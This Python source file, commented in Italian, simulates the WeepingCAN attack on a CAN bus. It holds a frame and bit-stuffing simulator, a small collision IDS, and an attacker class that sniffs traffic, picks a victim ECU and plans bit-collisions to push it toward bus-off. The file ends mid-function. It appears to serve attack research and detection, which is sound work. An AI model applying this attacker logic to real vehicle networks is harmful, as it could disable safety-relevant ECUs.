"""
Weeping CAN Attack Simulator con analisi bit-level e reinforcement learning
"""

import threading
import time
import random
from collections import defaultdict
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.multioutput import MultiOutputClassifier
import can
from enum import Enum, auto
from typing import List, Optional, Tuple
from dataclasses import dataclass

# --- Bit Value ---
class BitValue(Enum):
    DOMINANT = 0
    RECESSIVE = 1

    @staticmethod
    def from_int(v: int) -> "BitValue":
        return BitValue.DOMINANT if v == 0 else BitValue.RECESSIVE

    def __int__(self) -> int:
        return 0 if self is BitValue.DOMINANT else 1


class NodeState(Enum):
    ERROR_ACTIVE = auto()
    ERROR_PASSIVE = auto()
    BUS_OFF = auto()


class Field(Enum):
    SOF = auto()
    ID = auto()
    RTR = auto()
    IDE = auto()
    R0 = auto()
    DLC = auto()
    DATA = auto()
    CRC = auto()
    CRC_DELIM = auto()
    ACK_SLOT = auto()
    ACK_DELIM = auto()
    EOF = auto()
    INTERMISSION = auto()
    STUFF = auto()


@dataclass
class BitTransmission:
    bit_value: BitValue
    timestamp: float
    sender_name: str
    field: Field


def _crc15_can(bits: List[int]) -> int:
    """Compute CRC-15/CAN over a bit stream."""
    poly = 0x4599
    crc = 0
    for b in bits:
        msb = (crc >> 14) & 1
        crc = ((crc << 1) & 0x7FFF) | (b & 1)
        if msb:
            crc ^= poly
    return crc & 0x7FFF


class CANBitStream:
    """Build a *stuffed* CAN base frame bit stream and per-bit field labels."""

    def __init__(self, arbitration_id: int, data: bytes, r0: BitValue = BitValue.RECESSIVE):
        self.arb_id = arbitration_id & 0x7FF
        self.data = data[:8]
        self.r0 = r0

        self.bits: List[BitValue] = []
        self.fields: List[Field] = []
        self._build()

    def _push(self, bit: BitValue, field: Field):
        self.bits.append(bit)
        self.fields.append(field)

    def _build_unstuffed_payload_bits(self) -> Tuple[List[BitValue], List[Field]]:
        bits: List[BitValue] = []
        fields: List[Field] = []

        def push(bit: BitValue, field: Field):
            bits.append(bit)
            fields.append(field)

        # SOF
        push(BitValue.DOMINANT, Field.SOF)

        # 11-bit ID (MSB first)
        for i in range(10, -1, -1):
            push(BitValue.from_int((self.arb_id >> i) & 1), Field.ID)

        # Control field (base frame)
        push(BitValue.DOMINANT, Field.RTR)
        push(BitValue.DOMINANT, Field.IDE)
        push(self.r0, Field.R0)

        # DLC 4 bits
        dlc = len(self.data)
        for i in range(3, -1, -1):
            push(BitValue.from_int((dlc >> i) & 1), Field.DLC)

        # DATA bytes
        for byte in self.data:
            for i in range(7, -1, -1):
                push(BitValue.from_int((byte >> i) & 1), Field.DATA)

        # CRC
        crc_input = [int(b) for b in bits]
        crc = _crc15_can(crc_input)
        for i in range(14, -1, -1):
            push(BitValue.from_int((crc >> i) & 1), Field.CRC)

        # CRC delimiter
        push(BitValue.RECESSIVE, Field.CRC_DELIM)
        # ACK slot
        push(BitValue.RECESSIVE, Field.ACK_SLOT)
        push(BitValue.RECESSIVE, Field.ACK_DELIM)
        # EOF 7 recessive
        for _ in range(7):
            push(BitValue.RECESSIVE, Field.EOF)
        # Intermission 3 recessive
        for _ in range(3):
            push(BitValue.RECESSIVE, Field.INTERMISSION)

        return bits, fields

    @staticmethod
    def _apply_bit_stuffing(
        bits: List[BitValue], fields: List[Field]
    ) -> Tuple[List[BitValue], List[Field]]:
        """Stuff from SOF through end of CRC sequence (inclusive)."""
        out_bits: List[BitValue] = []
        out_fields: List[Field] = []

        run_val: Optional[BitValue] = None
        run_len = 0

        def should_stuff(idx: int) -> bool:
            return fields[idx] in {
                Field.SOF,
                Field.ID,
                Field.RTR,
                Field.IDE,
                Field.R0,
                Field.DLC,
                Field.DATA,
                Field.CRC,
            }

        for idx, (b, f) in enumerate(zip(bits, fields)):
            out_bits.append(b)
            out_fields.append(f)

            if not should_stuff(idx):
                run_val = None
                run_len = 0
                continue

            if run_val is None:
                run_val = b
                run_len = 1
            else:
                if b == run_val:
                    run_len += 1
                    if run_len == 5:
                        stuffed = BitValue.RECESSIVE if run_val is BitValue.DOMINANT else BitValue.DOMINANT
                        out_bits.append(stuffed)
                        out_fields.append(Field.STUFF)
                        run_val = stuffed
                        run_len = 1
                else:
                    run_val = b
                    run_len = 1

        return out_bits, out_fields

    def _build(self):
        raw_bits, raw_fields = self._build_unstuffed_payload_bits()
        stuffed_bits, stuffed_fields = self._apply_bit_stuffing(raw_bits, raw_fields)
        self.bits = stuffed_bits
        self.fields = stuffed_fields


def bytes_to_bits(data: bytes) -> List[int]:
    bits = []
    for byte in data:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)
    return bits


# --- CAN Bus Master ---
class CANBusMaster:
    """
    Simulatore semplificato:
    - arbitra frame tra più ECU
    - gestisce collisioni (stesso ID) e invia error flag active anche su vcan0
    """
    def __init__(self, use_vcan: bool = False):
        self.ecus = {}
        self.pending = []
        self.lock = threading.Lock()
        self._stop = False
        self._thread = None
        self.collect_window = 0.002
        self.use_vcan = use_vcan
        self.vcan_bus = None
        if self.use_vcan:
            try:
                self.vcan_bus = can.interface.Bus(channel='vcan0', interface='socketcan')
                print("[MASTER] Connected to vcan0")
            except Exception as e:
                print(f"[MASTER] Error connecting to vcan0: {e}")
                self.vcan_bus = None

    def register_ecu(self, ecu):
        self.ecus[ecu.slave_id] = ecu

    def submit_transmission(self, ecu, data: bytes, arb_id: int, r0: BitValue = BitValue.RECESSIVE):
        with self.lock:
            self.pending.append((ecu, data, arb_id, r0))

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop = True
        try:
            if self.vcan_bus is not None:
                self.vcan_bus.shutdown()
        except Exception:
            pass

    def _run(self):
        while not self._stop:
            with self.lock:
                if not self.pending:
                    pass
                else:
                    contenders = self.pending[:]
                    self.pending.clear()
                    self._process_contenders(contenders)
            time.sleep(self.collect_window)

    def _process_contenders(self, contenders):
        if len(contenders) == 1:
            ecu, data, arb_id, r0 = contenders[0]
            if ecu.is_bus_off():
                return
            self._transmit_frame(ecu, data, arb_id, r0, contenders)
            return

        contenders = [c for c in contenders if not c[0].is_bus_off()]
        if not contenders:
            return

        winner = self._perform_arbitration(contenders)
        if winner is None or winner[0] is None:
            return

        winner_ecu, winner_data, winner_id, winner_r0 = winner
        self._transmit_frame(winner_ecu, winner_data, winner_id, winner_r0, contenders)

    def _perform_arbitration(self, contenders):
        """Esegue l'arbitraggio bit-by-bit tra le ECU contendenti.

        contenders: List[(ecu, data, arb_id, r0)]
        """
        bitstreams = []
        for ecu, data, arb_id, r0 in contenders:
            bs = CANBitStream(arb_id, data, r0=r0)
            bitstreams.append((ecu, bs, arb_id, data, r0))

        active = list(range(len(bitstreams)))
        bit_idx = 0

        while len(active) > 1:
            if bit_idx >= min(len(bitstreams[i][1].bits) for i in active):
                break

            offered = []
            for i in active:
                ecu, bs, _, _, _ = bitstreams[i]
                if bit_idx < len(bs.bits):
                    bit = bs.bits[bit_idx]
                    field = bs.fields[bit_idx]
                    offered.append((i, ecu, bit, field))

            if not offered:
                break

            bus_bit = BitValue.DOMINANT if any(bit is BitValue.DOMINANT for _, _, bit, _ in offered) else BitValue.RECESSIVE
            field = offered[0][3]

            contenders_str = " | ".join([f"{ecu.name}={int(bit)}" for _, ecu, bit, _ in offered])
            print(f"  [ARB] {field.name:12s} | {contenders_str} -> BUS={int(bus_bit)}")

            # Durante l'arbitraggio ID, chi mette recessivo perde
            if field in {Field.SOF, Field.ID, Field.RTR}:
                losers = []
                for i, ecu, bit, _ in offered:
                    if bit is BitValue.RECESSIVE and bus_bit is BitValue.DOMINANT:
                        print(f"  [ARB] {ecu.name} perde arbitraggio")
                        losers.append(i)

                for loser_idx in sorted(losers, reverse=True):
                    if loser_idx in active:
                        active.remove(loser_idx)

            bit_idx += 1

            # Se stesso ID, continua con i dati/controllo: collisione volontaria (attacco)
            if field == Field.RTR and len(active) > 1:
                print(f"[MASTER] COLLISION! Stesso ID tra: {', '.join([bitstreams[i][0].name for i in active])}")
                return self._handle_collision(bitstreams, active, bit_idx)

        if len(active) == 1:
            winner_idx = active[0]
            winner_ecu, _, winner_id, winner_data, winner_r0 = bitstreams[winner_idx]
            print(f"[MASTER] WINNER: {winner_ecu.name} (ID=0x{winner_id:03X}) -> TRANSMIT")
            return winner_ecu, winner_data, winner_id, winner_r0

        return None, None, None, None

    def _handle_collision(self, bitstreams, active, start_bit_idx):
        """Gestisce collisione tra ECU con stesso ID (bit monitoring -> error flag).

        Correzione scenari TEC / prosecuzione trasmissione:
        - Se l'ECU che rileva l'errore è ERROR_ACTIVE -> invia Error Flag Active, frame abortito per tutti, TEC +8 per tutte le ECU coinvolte.
        - Se l'ECU che rileva l'errore è ERROR_PASSIVE -> invia Error Flag Passive (recessivo),
        l'altra ECU (che in quel bit sta mettendo DOMINANT) continua la trasmissione del suo frame:
            offender TEC +7, vincitore TEC -1 (gestito da _transmit_frame).
        """
        bit_idx = start_bit_idx
        error_detected = False
        offender_ecu = None

        offered_at_error = None  # snapshot per decidere chi continua
        bus_bit_at_error = None

        while len(active) > 0 and not error_detected:
            offered = []
            for i in active:
                ecu, bs, _, _, _ = bitstreams[i]
                if bit_idx < len(bs.bits):
                    bit = bs.bits[bit_idx]
                    field = bs.fields[bit_idx]
                    offered.append((i, ecu, bit, field))

            if not offered:
                break

            bus_bit = BitValue.DOMINANT if any(bit is BitValue.DOMINANT for _, _, bit, _ in offered) else BitValue.RECESSIVE
            field = offered[0][3]

            contenders_str = " | ".join([f"{ecu.name}={int(bit)}" for _, ecu, bit, _ in offered])
            print(f"  [TX]  {field.name:12s} | {contenders_str} -> BUS={int(bus_bit)}")

            # Bit monitoring: se una ECU mette recessivo ma legge dominante -> ERROR
            for _, ecu, bit, _ in offered:
                if bit is BitValue.RECESSIVE and bus_bit is BitValue.DOMINANT:
                    if field not in {Field.SOF, Field.ID, Field.RTR}:
                        print(
                            f"[MASTER] BIT ERROR rilevato da {ecu.name} (offender=bit_monitoring) -> error flag"
                        )
                        error_detected = True
                        offender_ecu = ecu
                            # ID coinvolto: prendilo da bitstreams (è uguale per tutti qui)
                        any_idx = offered[0][0]
                        arb_id = bitstreams[any_idx][2]   # nel tuo tuple sembra essere l'ID

                        if hasattr(self, "ids") and self.ids is not None:
                            # per ora usa bit_idx "assoluto". Se vuoi solo DATA, puoi filtrare field==Field.DATA
                            self.ids.observe_collision(arb_id=arb_id, bit_idx=bit_idx, offender_name=ecu.name)

                            alert = self.ids.check_alert(arb_id)
                            if alert:
                                print(
                                    f"[IDS] ALERT su ID=0x{alert['arb_id']:03X} | "
                                    f"collisions={alert['collisions']} in {alert['window_s']}s | "
                                    f"mode_bit={alert['mode_bit']} ({alert['mode_share']*100:.1f}%) | "
                                    f"H={alert['entropy']:.2f} | top_off={alert['top_offender']} ({alert['top_offender_share']*100:.1f}%)"
                                )
                        offered_at_error = offered[:]        # snapshot
                        bus_bit_at_error = bus_bit
                        break

            bit_idx += 1

        if not (error_detected and offender_ecu):
            return None, None, None, None

        # 1) invio error flag coerente con lo stato dell'offender
        self._send_error_flag(offender_ecu)

        involved = [bitstreams[i][0] for i in active]

        # 2) scenari TEC + prosecuzione
        if offender_ecu.state is NodeState.ERROR_ACTIVE:
            # Error Flag Active domina sempre: frame abortito per tutti
            for ecu in involved:
                ecu.tec += 8
                ecu._update_state()
                print(f"[MASTER] {ecu.name}: TEC={ecu.tec} (+8 per errore ACTIVE) State={ecu.state.name}")

            # Listener REC
            for ecu in self.ecus.values():
                if ecu not in involved and not ecu.is_bus_off():
                    ecu.rec += 1
                    print(f"[MASTER] {ecu.name}: REC={ecu.rec} (+1 per errore ricevuto)")

            return None, None, None, None

        # offender ERROR_PASSIVE:
        # Error Flag Passive è recessivo: chi stava dominando sul bit dell'errore continua con il suo frame.
        offender_ecu.tec += 7
        offender_ecu._update_state()
        print(f"[MASTER] {offender_ecu.name}: TEC={offender_ecu.tec} (+7 per errore PASSIVE) State={offender_ecu.state.name}")

        # scegli il vincitore come ECU che sul bit dell'errore stava mettendo DOMINANT (BUS=0),
        # diversa dall'offender (che stava mettendo RECESSIVE)
        winner_idx = None
        if offered_at_error is not None and bus_bit_at_error is BitValue.DOMINANT:
            for i, ecu, bit, _ in offered_at_error:
                if ecu is not offender_ecu and bit is BitValue.DOMINANT:
                    winner_idx = i
                    break

        # fallback (se per qualche motivo non troviamo il dominante)
        if winner_idx is None:
            for i in active:
                ecu = bitstreams[i][0]
                if ecu is not offender_ecu:
                    winner_idx = i
                    break

        if winner_idx is None:
            return None, None, None, None

        winner_ecu, _, winner_id, winner_data, winner_r0 = bitstreams[winner_idx]
        print(f"[MASTER] (PASSIVE FLAG) {winner_ecu.name} continua la trasmissione del frame originale")
        return winner_ecu, winner_data, winner_id, winner_r0

    def _send_error_flag_active(self, offender_ecu):
        """Invia error flag active (6 bit dominanti)"""
        print(f"\n[MASTER] Sending ERROR FLAG ACTIVE (6 dominant bits)")

        for bit_num in range(6):
            print(f"  [ERR] ERROR_FLAG_ACTIVE | {offender_ecu.name} -> BUS=0 (bit {bit_num+1}/6)")

        if self.use_vcan:
            try:
                error_msg = can.Message(
                    arbitration_id=0x7FF,
                    data=[0x00] * 6,
                    is_extended_id=False
                )
                self.vcan_bus.send(error_msg)
                print(f"[MASTER] Error Active Flag sent to vcan0")
            except Exception as e:
                print(f"[MASTER] Error sending error flag to vcan0: {e}")

    def _send_error_flag_passive(self, offender_ecu):
        """Invia error flag passive (8 bit recessivi)."""
        print(f"\n[MASTER] Sending ERROR FLAG PASSIVE (8 recessive bits)")
        for bit_num in range(8):
            print(f"  [ERR] ERROR_FLAG_PASSIVE | {offender_ecu.name} -> BUS=1 (bit {bit_num+1}/8)")
        # Nota: su SocketCAN non inviamo un vero error-frame; qui è solo logging.

    def _send_error_flag(self, offender_ecu):
        """Invia error flag coerente con lo stato dell'offender."""
        if offender_ecu.state is NodeState.ERROR_PASSIVE:
            self._send_error_flag_passive(offender_ecu)
        else:
            self._send_error_flag_active(offender_ecu)

    def _transmit_frame(self, winner_ecu, data, arb_id, r0, all_contenders):
        """Trasmette il frame vincente"""
        bs = CANBitStream(arb_id, data, r0=r0)

        for bit, field in zip(bs.bits, bs.fields):
            print(f"  [TX]  {field.name:12s} | {winner_ecu.name}={int(bit)}")

        print(f"[MASTER] Frame OK: ID=0x{arb_id:03X} data={data.hex().upper()}")

        if self.use_vcan:
            try:
                msg = can.Message(
                    arbitration_id=arb_id,
                    data=data,
                    is_extended_id=False
                )
                self.vcan_bus.send(msg)
            except Exception as e:
                print(f"[MASTER] Error sending to vcan0: {e}")

        # TEC -= 1 per il vincitore (modello semplificato usato nel simulatore)
        winner_ecu.tec = max(0, winner_ecu.tec - 1)
        winner_ecu._update_state()
        print(f"[MASTER] {winner_ecu.name}: TEC={winner_ecu.tec} (-1 per successo) State={winner_ecu.state.name}")

        # REC -= 1 per i listener
        for ecu in self.ecus.values():
            if ecu != winner_ecu and not ecu.is_bus_off() and ecu.rec > 0:
                ecu.rec -= 1


# --- Base ECU ---
class BaseECU:
    def __init__(self, name: str, slave_id: int, arb_id: int, master: CANBusMaster,
                 tx_period: float = 3.0, start_delay: float = 0.0):
        self.name = name
        self.slave_id = slave_id
        self.arb_id = arb_id & 0x7FF
        self.master = master
        self.tx_period = tx_period
        self.start_delay = start_delay

        self.tec = 0
        self.rec = 0
        self.state = NodeState.ERROR_ACTIVE

        self.next_tx_time = 0.0
        self._stop = False
        self._tx_thread = None

        # per rendere l'analisi dei bit "sensata", usiamo un payload semi-deterministico:
        # molti bit stabili + un counter (gli ultimi 2 byte)
        self._counter = 0
        self.random_payload = False  # se vuoi proprio random: set True

        self.master.register_ecu(self)

    def start(self):
        print(f"[{self.name}] START slave_id={self.slave_id} ID=0x{self.arb_id:03X} period={self.tx_period:.2f}s")
        self.next_tx_time = time.time() + self.start_delay
        self._tx_thread = threading.Thread(target=self._tx_loop, daemon=True)
        self._tx_thread.start()

    def stop(self):
        self._stop = True

    def is_bus_off(self) -> bool:
        return self.state is NodeState.BUS_OFF

    def _update_state(self):
        if self.tec >= 256:
            self.state = NodeState.BUS_OFF
            print(f"[{self.name}] *** ENTERED BUS-OFF STATE *** (TEC={self.tec})")
        elif self.tec >= 128:
            if self.state != NodeState.ERROR_PASSIVE:
                self.state = NodeState.ERROR_PASSIVE
                print(f"[{self.name}] Entered ERROR-PASSIVE state (TEC={self.tec})")
        else:
            self.state = NodeState.ERROR_ACTIVE

    def get_time_until_tx(self) -> float:
        return max(0.0, self.next_tx_time - time.time())

    def _build_payload(self) -> bytes:
        """
        Payload più realistico (predicibile):
        - Byte 0..2: identificativi (stabili)
        - Byte 3..4: segnali lenti (random walk)
        - Byte 5: bitfield stato (cambia raramente) + un nibble "alive" lento
        - Byte 6..7: counter 16-bit (rolling)
        """

        import random

        # --- counter 16-bit (rolling) ---
        c = self._counter & 0xFFFF
        self._counter = (self._counter + 1) & 0xFFFF

        # --- inizializza stato interno (una volta sola) ---
        # (non hardcodo la "macchina": sono solo segnali lenti generici)
        if not hasattr(self, "_sig_a"):
            self._sig_a = random.randint(20, 60)   # es. "velocità" fittizia (0..255)
        if not hasattr(self, "_sig_b"):
            self._sig_b = random.randint(80, 140)  # es. "rpm/torque" fittizio
        if not hasattr(self, "_flags"):
            self._flags = random.randint(0, 15)    # 4 bit di flags
        if not hasattr(self, "_alive4"):
            self._alive4 = 0                       # 4-bit rolling counter lento

        # --- update segnali lenti (random walk) ---
        # piccole variazioni, non i.i.d.
        if random.random() < 0.80:
            self._sig_a = max(0, min(255, self._sig_a + random.choice([-1, 0, 1])))
        if random.random() < 0.70:
            self._sig_b = max(0, min(255, self._sig_b + random.choice([-2, -1, 0, 1, 2])))

        # flags cambiano raramente
        if random.random() < 0.05:
            bit = 1 << random.randint(0, 3)
            self._flags ^= bit

        # alive nibble (lento e prevedibile)
        if (c & 0x000F) == 0:          # ogni 16 frame circa
            self._alive4 = (self._alive4 + 1) & 0x0F

        # --- costruzione payload ---
        p = bytearray(8)

        # 0..2: stabili/identificativi
        p[0] = (self.arb_id >> 3) & 0xFF
        p[1] = self.arb_id & 0xFF
        p[2] = self.slave_id & 0xFF

        # 3..4: segnali lenti
        p[3] = self._sig_a
        p[4] = self._sig_b

        # 5: flags (4 bit alti) + alive (4 bit bassi)
        p[5] = ((self._flags & 0x0F) << 4) | (self._alive4 & 0x0F)

        # 6..7: counter 16-bit
        p[6] = (c >> 8) & 0xFF
        p[7] = c & 0xFF

        return bytes(p)

    def _tx_loop(self):
        # loop con sleep fine -> la vittima è molto più "periodica" e l'attacker si sincronizza meglio
        while not self._stop:
            if self.is_bus_off():
                time.sleep(0.01)
                continue

            now = time.time()
            dt = self.next_tx_time - now

            if dt <= 0:
                data = self._build_payload()
                print(f"[{self.name}] VUOLE TRASMETTERE (ID=0x{self.arb_id:03X}) TEC={self.tec} REC={self.rec} State={self.state.name}")
                self.master.submit_transmission(self, data, self.arb_id, r0=BitValue.RECESSIVE)

                # schedule senza drift (mantiene periodo costante)
                self.next_tx_time += self.tx_period
                # se eravamo in ritardo tanto, "recupera"
                while self.next_tx_time <= now:
                    self.next_tx_time += self.tx_period

                continue

            time.sleep(min(dt, 0.005))

import time
import math
from collections import deque, Counter, defaultdict

class SimpleCANIDS:
    """
    IDS minimal:
      1) collision rate per ID in finestra W
      2) bit index concentration (mode share o entropia bassa)
    Non assume attacker/victim a priori.
    """

    def __init__(
        self,
        window_s: float = 2.0,          # finestra temporale
        min_collisions: int = 6,        # N collisioni in window per trigger rate
        mode_share_th: float = 0.60,    # >=60% collisioni sullo stesso bit
        entropy_th: float = 2.0,        # entropia bassa => concentrato (0..~6 per 64 bit)
        cooldown_s: float = 1.0         # evita spam alert
    ):
        self.window_s = window_s
        self.min_collisions = min_collisions
        self.mode_share_th = mode_share_th
        self.entropy_th = entropy_th
        self.cooldown_s = cooldown_s

        # events[arb_id] = deque of (ts, bit_idx, offender_name)
        self.events = defaultdict(deque)
        self._last_alert_ts = {}  # per arb_id

    def _prune(self, arb_id: int, now: float):
        dq = self.events[arb_id]
        cutoff = now - self.window_s
        while dq and dq[0][0] < cutoff:
            dq.popleft()

    @staticmethod
    def _entropy(counts: Counter) -> float:
        total = sum(counts.values())
        if total <= 0:
            return 0.0
        H = 0.0
        for c in counts.values():
            p = c / total
            H -= p * math.log(p + 1e-12, 2)
        return H

    def observe_collision(self, arb_id: int, bit_idx: int, offender_name: str, ts: float | None = None):
        now = time.time() if ts is None else float(ts)
        dq = self.events[arb_id]
        dq.append((now, int(bit_idx), str(offender_name)))
        self._prune(arb_id, now)

    def check_alert(self, arb_id: int, ts: float | None = None):
        now = time.time() if ts is None else float(ts)
        self._prune(arb_id, now)
        dq = self.events.get(arb_id)
        if not dq:
            return None

        # collision rate proxy: numero collisioni in finestra
        n = len(dq)
        if n < self.min_collisions:
            return None

        # bit concentration
        bits = [b for _, b, _ in dq]
        bit_counts = Counter(bits)
        mode_bit, mode_cnt = bit_counts.most_common(1)[0]
        mode_share = mode_cnt / n
        H = self._entropy(bit_counts)

        # cooldown anti-spam
        last = self._last_alert_ts.get(arb_id, 0.0)
        if now - last < self.cooldown_s:
            return None

        # decisione: forte se mode_share alto oppure entropia bassa
        concentrated = (mode_share >= self.mode_share_th) or (H <= self.entropy_th)
        if not concentrated:
            return None

        # (opzionale) offender più frequente nella finestra
        offenders = [o for _, _, o in dq]
        off_counts = Counter(offenders)
        top_off, top_off_cnt = off_counts.most_common(1)[0]
        top_off_share = top_off_cnt / n

        self._last_alert_ts[arb_id] = now
        return {
            "arb_id": arb_id,
            "window_s": self.window_s,
            "collisions": n,
            "mode_bit": mode_bit,
            "mode_share": mode_share,
            "entropy": H,
            "top_offender": top_off,
            "top_offender_share": top_off_share,
        }


# --- Weeping Attacker ---
class WeepingAttacker:
    def __init__(self, master: CANBusMaster, sniff_duration_1=150, sniff_duration_2=30):
        self.name = "ATTACKER"
        self.slave_id = 999
        self.master = master
        self.sniff_duration_1 = sniff_duration_1  # 75% training
        self.sniff_duration_2 = sniff_duration_2  # 25% reinforcement

        self.tec = 0
        self.rec = 0
        self.state = NodeState.ERROR_ACTIVE

        self.running = False
        self.attack_state = "sniffing_1"  # sniffing_1, analyzing, sniffing_2, reinforcement, attacking

        # Sniffing data
        self.sniffed_data_1 = defaultdict(list)
        self.sniffed_data_2 = defaultdict(list)
        self.min_sniffed_id = None

        self.seen_ids = set()
        self.reset_id = None

        # Victim
        self.victim_id = None
        self.victim_ecu = None
        self.victim_messages = []
        self.victim_bit_probabilities = []
        self.avg_interval = None
        self.last_victim_time = None
        self.next_attack_time = None

        # --- Anti flood / anti self-collision ---
        self._last_attacked_cycle_ts = None
        self._pending_cycle_ts = None

        # Attack params
        # R0 non deve essere la leva dell'attacco (per WeepingCAN lavoriamo nel DATA field),
        # quindi lo teniamo recessive come la vittima.
        self.attack_r0 = BitValue.RECESSIVE

        # --- TEC management (per non andare troppo facilmente in ERROR_PASSIVE) ---
        # Se TEC cresce troppo, smetti di attaccare e "ripulisci" TEC con messaggi innocui.
        self.tec_soft_limit = 72     # sopra questo, riduci aggressività
        self.tec_hard_limit = 88     # sopra questo, cooldown (no attack finché non scendi)
        self.tec_target = 40         # target dopo cooldown
        self.max_reset_per_round = 6  # massimo reset frames per round (best effort, _reduce_tec può interrompersi)

        # --- Randomizzazione bit d'attacco (anti “attacca sempre lo stesso bit”) ---
        self.attack_topk_bits = 12        # scegli tra i top-K candidati più “promettenti”
        self.attack_eps_explore = 0.20    # 20% esplorazione uniforme sui top-K
        self.attack_softmax_temp = 0.60   # temperatura softmax (più bassa = più greedy)

        self._bit_attack_counts = [0] * 64  # anti-sticking: penalizza bit già usati spesso

        self._thread = None
        self._vcan_listener_thread = None
        self._stop = False

        # Dedicated socketCAN listener (do NOT reuse master's socket)
        self.sniff_bus = None
        if self.master.use_vcan:
            try:
                self.sniff_bus = can.interface.Bus(channel='vcan0', interface='socketcan')
                print("[ATTACKER] Connected dedicated sniff socket to vcan0")
            except Exception as e:
                print(f"[ATTACKER] Error connecting dedicated sniff socket to vcan0: {e}")
                self.sniff_bus = None

        self.master.register_ecu(self)

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

        self._vcan_listener_thread = threading.Thread(target=self._vcan_listener, daemon=True)
        self._vcan_listener_thread.start()

    def stop(self):
        self.running = False
        self._stop = True
        try:
            if self.sniff_bus is not None:
                self.sniff_bus.shutdown()
        except Exception:
            pass

    def is_bus_off(self) -> bool:
        return self.state is NodeState.BUS_OFF

    def _update_state(self):
        if self.tec >= 256:
            self.state = NodeState.BUS_OFF
            print(f"[ATTACKER] *** ENTERED BUS-OFF STATE *** (TEC={self.tec})")
        elif self.tec >= 128:
            if self.state != NodeState.ERROR_PASSIVE:
                self.state = NodeState.ERROR_PASSIVE
                print(f"[ATTACKER] Entered ERROR-PASSIVE state (TEC={self.tec})")
        else:
            self.state = NodeState.ERROR_ACTIVE

    def get_time_until_tx(self) -> float:
        return 999.0  # Non trasmette periodicamente

    @property
    def arb_id(self):
        if self.attack_state == "attacking" and self.victim_id:
            return self.victim_id
        return 0x7FF

    def _vcan_listener(self):
        """Sniffa da vcan0 (solo frame *davvero* trasmessi su SocketCAN)."""
        if not self.master.use_vcan or self.sniff_bus is None:
            return

        print("[ATTACKER] Started vcan0 listener")

        while not self._stop:
            try:
                msg = self.sniff_bus.recv(timeout=1.0)

                # Live victim timing update (se arrivano frame reali su vcan0)
                if msg and self.victim_id is not None and msg.arbitration_id == self.victim_id:
                    self.last_victim_time = time.time()

                if msg and self.attack_state == "sniffing_1":
                    frame_data = bytes(msg.data)
                    frame_bits = bytes_to_bits(frame_data)

                    ts = time.time()
                    self.sniffed_data_1[msg.arbitration_id].append({
                        'data': frame_data,
                        'bits': frame_bits,
                        'timestamp': ts
                    })

                    self.seen_ids.add(msg.arbitration_id)

                    if self.min_sniffed_id is None or msg.arbitration_id < self.min_sniffed_id:
                        self.min_sniffed_id = msg.arbitration_id

                    data_hex = ' '.join([f'{b:02X}' for b in frame_data])
                    print(f"[ATTACKER SNIFF-1] ID=0x{msg.arbitration_id:03X} Data=[{data_hex}]")

                elif msg and self.attack_state == "sniffing_2" and msg.arbitration_id == self.victim_id:
                    frame_data = bytes(msg.data)
                    frame_bits = bytes_to_bits(frame_data)

                    self.sniffed_data_2[msg.arbitration_id].append({
                        'data': frame_data,
                        'bits': frame_bits,
                        'timestamp': time.time()
                    })

                    data_hex = ' '.join([f'{b:02X}' for b in frame_data])
                    print(f"[ATTACKER SNIFF-2] ID=0x{msg.arbitration_id:03X} Data=[{data_hex}]")

            except Exception:
                pass

    def _run(self):
        # Phase 1: Sniffing (Training)
        print(f"\n{'='*100}")
        print(f"[ATTACKER] PHASE 1: SNIFFING (Training) for {self.sniff_duration_1} seconds...")
        print(f"{'='*100}\n")

        sniff_start = time.time()
        while time.time() - sniff_start < self.sniff_duration_1:
            time.sleep(5)
            if len(self.sniffed_data_1) > 0:
                total_msgs = sum(len(msgs) for msgs in self.sniffed_data_1.values())
                print(f"[ATTACKER] Sniffed {total_msgs} messages from {len(self.sniffed_data_1)} different IDs")

        # Phase 2: Analysis
        print(f"\n{'='*100}")
        print(f"[ATTACKER] PHASE 2: ANALYZING sniffed data...")
        print(f"{'='*100}\n")

        self.attack_state = "analyzing"
        self._select_victim()

        if self.victim_id is None:
            print("[ATTACKER] No suitable victim found. Aborting.")
            self.running = False
            return

        if len(self.victim_messages) < 2:
            print(f"[ATTACKER] Not enough messages from victim (found {len(self.victim_messages)}). Aborting.")
            self.running = False
            return

        self._analyze_victim_bits()

        if not self.victim_bit_probabilities:
            print("[ATTACKER] Analysis failed. Aborting.")
            self.running = False
            return

        # Phase 3: Sniffing 2 (Reinforcement)
        print(f"\n{'='*100}")
        print(f"[ATTACKER] PHASE 3: SNIFFING (Reinforcement) for {self.sniff_duration_2} seconds...")
        print(f"{'='*100}\n")

        self.attack_state = "sniffing_2"
        sniff_start_2 = time.time()
        while time.time() - sniff_start_2 < self.sniff_duration_2:
            time.sleep(2)
            if self.victim_id in self.sniffed_data_2:
                print(f"[ATTACKER] Collected {len(self.sniffed_data_2[self.victim_id])} reinforcement messages")

        # Phase 4: Reinforcement Learning
        print(f"\n{'='*100}")
        print(f"[ATTACKER] PHASE 4: REINFORCEMENT LEARNING...")
        print(f"{'='*100}\n")

        self.attack_state = "reinforcement"
        self._reinforcement_learning()

        # Phase 5: Attack
        print(f"\n{'='*100}")
        print(f"[ATTACKER]  ATTACCO INIZIATO! ")
        print(f"[ATTACKER] Target: ID=0x{self.victim_id:03X}")
        if self.avg_interval is not None:
            print(f"[ATTACKER] Average interval: {self.avg_interval:.3f}s")
        print(f"[ATTACKER] Strategy: send SAME ID + R0=0 (dominant) to force bit-monitoring error on R0")
        print(f"{'='*100}\n")

        self.attack_state = "attacking"
        self._attack_loop()

    def _estimate_interval(self, timestamps):
        """Stima robusta dell'intervallo di trasmissione usando mediana + filtro outlier."""
        if not timestamps or len(timestamps) < 2:
            return None
        ts = sorted(timestamps)
        intervals = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
        intervals = [x for x in intervals if x > 0.0005]
        if not intervals:
            return None
        med = float(np.median(intervals))
        kept = [x for x in intervals if 0.5 * med <= x <= 1.5 * med]
        if len(kept) >= 2:
            return float(np.mean(kept))
        return med
    

    def _select_victim(self):
        """Seleziona la vittima (ID che trasmette più frequentemente)."""
        if not self.sniffed_data_1:
            print("[ATTACKER] No data sniffed during phase 1")
            return

        self.victim_id = max(self.sniffed_data_1, key=lambda k: len(self.sniffed_data_1[k]))
        self.victim_messages = self.sniffed_data_1[self.victim_id]

        # Trova riferimento all'ECU reale
